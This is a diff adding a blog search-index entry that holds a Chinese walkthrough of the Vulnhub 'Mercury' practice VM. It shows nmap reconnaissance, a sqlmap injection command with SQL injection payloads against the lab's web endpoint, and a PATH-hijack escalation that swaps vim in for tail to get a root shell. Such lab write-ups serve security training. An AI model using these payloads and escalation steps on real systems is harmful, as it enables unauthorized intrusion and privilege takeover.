@@ -293,4 +293,40 @@
         <tag>TCP/IP数据包头</tag>
       </tags>
   </entry>
+  <entry>
+    <title>Mercury</title>
+    <url>/2021/11/07/Mercury/index/</url>
+    <content><![CDATA[<h1 id="Vulnhub-Mercury打靶"><a href="#Vulnhub-Mercury打靶" class="headerlink" title="Vulnhub Mercury打靶"></a>Vulnhub Mercury打靶</h1><h2 id="靶机介绍"><a href="#靶机介绍" class="headerlink" title="靶机介绍"></a>靶机介绍</h2><p>星球系列靶机</p>
+<p>下载地址：<a href="https://drive.google.com/file/d/1GkmkuZCXrSvSzTyXxQZfjpL-psqZF7Td">https://drive.google.com/file/d/1GkmkuZCXrSvSzTyXxQZfjpL-psqZF7Td</a></p>
+<p>难度：Easy</p>
+<p>利用技术：</p>
+<p>​    setnv提权</p>
+<p>攻击主机：Kali Linux</p>
+<h2 id="开始打靶"><a href="#开始打靶" class="headerlink" title="开始打靶"></a>开始打靶</h2><h3 id="1-信息收集"><a href="#1-信息收集" class="headerlink" title="1.信息收集"></a>1.信息收集</h3><p>首先进行信息，<code>arp-scan </code> <code>nmap</code>进行主机发现和端口扫描</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo arp-scan -l</span><br><span class="line">192.168.0.100	08:00:27:09:37:ea	PCS Systemtechnik GmbH</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">nmap -sV -p- -sC 192.168.0.100</span><br><span class="line">Starting Nmap 7.91 ( https://nmap.org ) at 2021-11-07 02:20 EST</span><br><span class="line">Nmap scan report for 192.168.0.100</span><br><span class="line">Host is up (0.0045s latency).</span><br><span class="line">Not shown: 65533 closed ports</span><br><span class="line">PORT     STATE SERVICE    VERSION</span><br><span class="line">22/tcp   open  ssh        OpenSSH 8.2p1 Ubuntu 4ubuntu0.1 (Ubuntu Linux; protocol 2.0)</span><br><span class="line">| ssh-hostkey: </span><br><span class="line">|   3072 c8:24:ea:2a:2b:f1:3c:fa:16:94:65:bd:c7:9b:6c:29 (RSA)</span><br><span class="line">|   256 e8:08:a1:8e:7d:5a:bc:5c:66:16:48:24:57:0d:fa:b8 (ECDSA)</span><br><span class="line">|_  256 2f:18:7e:10:54:f7:b9:17:a2:11:1d:8f:b3:30:a5:2a (ED25519)</span><br><span class="line">8080/tcp open  http-proxy WSGIServer/0.2 CPython/3.8.2</span><br></pre></td></tr></table></figure>
+
+<p>目标打开了<code>22</code> <code>8080</code>端口</p>
+<h3 id="2-漏洞发现-amp-利用"><a href="#2-漏洞发现-amp-利用" class="headerlink" title="2.漏洞发现&amp;利用"></a>2.漏洞发现&amp;利用</h3><p><img src="https://cdn.jsdelivr.net/gh/yifaang/picture@master/202111071532573.jpg"></p>
+<p>打开目标的<code>8080</code>端口，并没有发现任何有用的信息，包括审查页面的源码，以及<code>robots.txt</code>，都没有一点有价值的信息，尝试随便输入一个地址看一下，发现报错内容里面存在一个路径 <code>/mercuryfacts </code>，访问后发现了该页面</p>
+<p><img src="https://cdn.jsdelivr.net/gh/yifaang/picture@master/202111071537948.png"></p>
+<p><code>id</code>这个关键字应该是很敏感了，更何况地址栏那么明显的伪静态，使用sqlmap进行注入，获得服务器密码</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">└─$ sqlmap -u http://192.168.0.100:8080/mercuryfacts/1* --dbs --batch</span><br><span class="line">    Type: boolean-based blind</span><br><span class="line">    Title: AND boolean-based blind - WHERE or HAVING clause</span><br><span class="line">    Payload: http://192.168.0.100:8080/mercuryfacts/1 AND 2334=2334</span><br><span class="line"></span><br><span class="line">    Type: error-based</span><br><span class="line">    Title: MySQL &gt;= 5.6 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (GTID_SUBSET)</span><br><span class="line">    Payload: http://192.168.0.100:8080/mercuryfacts/1 AND GTID_SUBSET(CONCAT(0x716a786271,(SELECT (ELT(3697=3697,1))),0x7170626a71),3697)</span><br></pre></td></tr></table></figure>
+
+<p>获得了服务器密码后，ssh进行登录</p>
+<p><img src="https://cdn.jsdelivr.net/gh/yifaang/picture@master/202111071542316.png"></p>
+<p>获得了另一个操作系统账户，进行登录</p>
+<h3 id="3-提权-amp-amp-偷天换日"><a href="#3-提权-amp-amp-偷天换日" class="headerlink" title="3.提权&amp;&amp;偷天换日"></a>3.提权&amp;&amp;偷天换日</h3><p>/usr/bin/check_syslog.sh内容为</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">!/bin/bash</span></span><br><span class="line">tail -n 10 /var/log/syslog</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.jsdelivr.net/gh/yifaang/picture@master/202111071608660.png"></p>
+<p>复制<code>/bin/vim</code>命名为<code>/tmp/tail</code>，添加系统变量，使tail命令调用/tmp/tail文件，以root打开vim，在vim命令界面输入 <code>!/bin/bash</code> 提权成功 [这波直接偷天换日]</p>
+<p>打靶结束！！！</p>
+]]></content>
+      <categories>
+        <category>Vulnhub</category>
+      </categories>
+      <tags>
+        <tag>Vulnhub-Easy</tag>
+      </tags>
+  </entry>
 </search>
